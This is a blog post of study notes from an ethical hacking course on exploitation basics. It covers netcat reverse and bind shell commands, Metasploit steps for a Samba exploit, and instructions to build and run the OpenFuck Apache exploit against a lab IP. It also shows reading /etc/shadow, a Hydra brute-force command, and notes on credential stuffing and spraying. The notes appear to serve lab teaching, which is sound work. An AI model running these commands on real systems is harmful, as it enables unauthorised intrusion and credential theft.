---
layout: post
title:  "TCM_security_EthicalHacking Part 8"
author: haran
categories: [TCM , Cyber Security]
image: post_img/2021/01/01_1/tcm.png
beforetoc: "Exploitation Basics"
toc: true
---

Exploitation Basics

Exploitation Basics

Reverse Shells vs Bind Shells

Reverse shell

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/1.jpg)

Target connecting to us.

(Kali)Attack Box = nc -nvlp 4444 (Listening)
 Target Box      = nc 192.168.1.2 4444 -e /bin/bash  

BindShell

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/2.jpg)

(Kali)Attack Box = nc 192.168.1.2 4444
 Target Box      = nc -lvp 4444 -e /bin/bash (Listening)
 
 
Staged vs Non-Staged Payloads


Staged vs Non-Staged Payloads

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/3.jpg)

Payload = the code we are going to run as exploit
          attack and get a shell on victim.
          
Non-staged = send payloads at once
             larger in size won't always work
             Example = windows/meterpreter_reverse_tcp
             
staged     = send payloads stage by stage.
             can be less stable
             windows/meterpreter/reverse_tcp
             
Gaining Root with Metasploit

smb exploitation with metaspolit

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/4.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/5.jpg)

commands

search trans2open
use 1
options
set rhosts 192.168.8.167
set rport 139
show targets
run/exploit

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/6.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/7.jpg)

set payload /   /  /

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/8.jpg)

Manual Exploitation

 https://github.com/heltonWernik/OpenLuck
 
 Usage

 This Exploit (https://www.exploit-db.com/exploits/764/) is outdated. Here you can take updated
 
 1.Download OpenFuck.c

 git clone https://github.com/heltonWernik/OpenFuck.git

 1.Install ssl-dev library

 apt-get install libssl-dev

 1.It's Compile Time
 
 gcc -o OpenFuck OpenFuck.c -lcrypto

 1.Running the Exploit

 ./OpenFuck

 1.See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6a option ./OpenFuck 0x6a [Target Ip] [port] -c 40
 
 for example:

 ./OpenFuck 0x6a 192.168.80.145 443 -c 40
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/9.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/10.jpg)
 
 cat /etc/passwd
 cat /etc/shadow
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/11.jpg)
 
 
 
Brute Force Attacks

Hydra

-l = user
-P = password list
-t = thread
-V = verbosity 

hydra -l root  -P /usr/share/wordlists/metasploit/adobe_top100_pass.txt

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/12.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/13.jpg)

Using Metaspolit

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/14.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/15.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/16.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/17.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/18.jpg)





Credential Spraying and Password Stuffing

What is cedential stuffing?

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/19.jpg)

foxy proxy


![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/20.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/21.jpg)



sniper = sniper uses one parameter
pitch fork = multi parameter payload

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/22.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_8/23.jpg)

password spraying


unknown username 
known password